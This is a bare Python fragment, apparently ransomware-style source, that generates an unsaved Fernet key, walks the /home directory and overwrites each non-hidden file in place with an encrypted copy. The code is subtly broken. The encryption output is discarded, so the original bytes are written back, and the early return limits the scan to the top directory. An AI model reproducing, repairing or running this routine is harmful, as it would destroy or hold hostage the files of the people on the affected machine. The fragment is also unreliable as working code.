key = Fernet.generate_key()
cipher = Fernet(key)
h_dir = "/home"


def get2(h_dir):
    files = []
    for dirpath, dirnames, filenames in os.walk(h_dir):
        filenames = [f for f in filenames if not f.startswith('.')]
        dirnames = [d for d in dirnames if not d.startswith('.')]
        for filename in filenames:
            full_path = os.path.join(dirpath, filename)
            if os.path.isfile(full_path):
                files.append(full_path)
        return files


fl = get2(h_dir)

for ile in fl:
    with open(ile, 'r+b') as f:
        ct = f.read()
        cipher.encrypt(ct)
        f.seek(0)
        f.write(ct)
        f.truncate()
        f.close()
